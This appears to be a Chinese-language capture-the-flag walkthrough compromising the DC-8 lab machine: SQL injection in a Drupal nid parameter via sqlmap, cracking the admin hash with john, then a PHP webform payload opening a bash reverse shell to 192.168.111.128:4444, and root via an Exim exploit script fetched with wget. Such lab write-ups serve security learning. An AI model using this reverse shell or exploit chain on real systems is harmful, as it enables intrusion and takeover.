# DC-8
对目标进行nmap扫描
![](vx_images/198025579402274.png)
一个Drupal站点
![](vx_images/71566433965269.png)
目录扫一下
![](vx_images/27465724219895.png)
发现版本信息
![](vx_images/220794857154592.png)
看到版本是7.67
msf上的脚本都试了下无法利用
回到web点击detail发现nid参数测试一下sql注入
![](vx_images/379735680690973.png)
果然存在
sqlmap跑
![](vx_images/397445778463640.png)
尝试获取个shell,但是失败了
那就看一下账号密码
改密码$S$DMtruNEVmqWoqhlPwTlnFzwyBRFgQwXUfppe9pW1RqqXlMy97tzA

```
update users set pass='$S$DMtruNEVmqWoqhlPwTlnFzwyBRFgQwXUfppe9pW1RqqXlMy97tzA' where uid=1
```
![](vx_images/424085021656238.png)
改不了,那就看看能不能爆破一下hash,jianghash放入文件中
```
john drupal_hash.txt
```
![](vx_images/19513711623249.png)
成功登录
![](vx_images/37602066679536.png)
几经摸索,创建webform中可以添加php代码
![](vx_images/282873317248478.png)
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.111.128/4444 0>&1'");?>
```
但是访问后弹不回shell,网站给出了说明

![](vx_images/5695190790054.png)
想了下顶部的几个文章可以下手,修改oncat us
![](vx_images/113696529117354.png)
然后输入表单提交,触发shell
![](vx_images/270715737870111.png)
home目录下的用户什么信息都没有
sudo -l也没有权限
查找一下suid
![](vx_images/560806183966668.png)
![](vx_images/169775012943088.png)
查看一下debian-exiam用户
![](vx_images/102978741620996.png)
应该是提示
Exim是 Linux 系统中常用的邮件传输代理（MTA）软件
![](vx_images/427732405758812.png)
![](vx_images/507440791878578.png)
![](vx_images/498184514759288.png)
这个可以利用
接下来将其上传
用wget命令下载
kali上开启python的http服务
![](vx_images/599372791948783.png)
![](vx_images/96814795934981.png)
赋予脚本执行权限,执行
![](vx_images/223503204759003.png)
./46996.sh -m netcat
![](vx_images/51784274227074.png)
